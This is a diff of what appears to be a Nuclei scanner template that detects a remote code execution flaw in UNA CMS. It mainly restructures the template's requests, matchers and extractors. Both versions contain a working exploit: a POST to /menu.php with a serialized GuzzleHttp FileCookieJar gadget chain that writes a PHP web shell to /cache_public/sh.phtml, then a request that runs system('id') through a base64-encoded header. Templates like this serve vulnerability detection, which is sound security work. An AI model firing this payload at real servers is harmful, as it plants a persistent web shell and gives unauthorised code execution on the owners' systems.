@@ -15,13 +15,19 @@ info:
   metadata:
     runzero-match: any(each(service["http.bodies"]), {# matches "Powered by UNA"})
     fofa-query: body="Powered by UNA"
-    max-request: 3
+    max-request: 2
     verified: true
   tags: php,rce,una-cms,vuln
 variables:
-  cmd: "echo '{{randstr}}'. system('id') . '{{randstr}}';"
+  cmd: echo '{{randstr}}'. system('id') . '{{randstr}}';
+flow: http(1) && http(2)
 http:
-  - raw:
+  - matchers:
+      - internal: true
+        status:
+          - 200
+        type: status
+    raw:
       - |
         POST /menu.php HTTP/1.1
         Host: {{Hostname}}
@@ -29,38 +35,30 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         o=sys_set_acl_level&a=SetAclLevel&level_id=1&profile_id=O%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A3%3A%7Bs%3A40%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A2%3A%7Bs%3A7%3A%22Expires%22%3Bs%3A0%3A%22%22%3Bs%3A5%3A%22Value%22%3Bs%3A49%3A%22%3C%3Fphp+eval%28base64_decode%28%24_SERVER%5B%27HTTP_X%27%5D%29%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A23%3A%22.%2Fcache_public%2Fsh.phtml%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7D
+  - extractors:
+      - group: 1
+        internal: false
+        name: id
+        part: body
+        regex:
+          - (?s){{randstr}}(.*?){{randstr}}
+        # digest: 4a0a00473045022047995af54a3371a7a874a1ac349eb0848a9496987f029d6698a23a2519180539022100d347678463eaccb7195ee39e5c53924c899614324eba2610052e52097e4ce846:922c64590222798bb761d5b6d8e72950
+
+        type: regex
     matchers:
-      - type: status
-        status:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - '{{randstr}}'
+          - uid=
+      - status:
           - 200
-        internal: true
-  - raw:
+        type: status
+    matchers-condition: and
+    raw:
       - |
         GET /cache_public/sh.phtml HTTP/1.1
         Host: {{Hostname}}
         X-Requested-With: XMLHttpRequest
         X: {{base64(cmd)}}
-      - |
-        GET /cache_public/sh.php HTTP/1.1
-        Host: {{Hostname}}
-        X-Requested-With: XMLHttpRequest
-        X: {{base64(cmd)}}
-    stop-at-first-match: true
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'Expires'
-          - 'Value'
-          - 'uid='
-          - 'groups='
-        condition: and
-    extractors:
-      - type: regex
-        part: body
-        internal: false
-        name: id
-        group: 1
-        regex:
-          - '{{randstr}}(.*){{randstr}}'
-        # digest: 4a0a00473045022029ec684aa03ff28a945a2b1c35c94c1666a69d123d0b7605bf690f81c1b644d70221008d40ff17baeeaf4161e36ec0200cb3b1c330922b579af156ece0c5aac4512c0a:922c64590222798bb761d5b6d8e72950
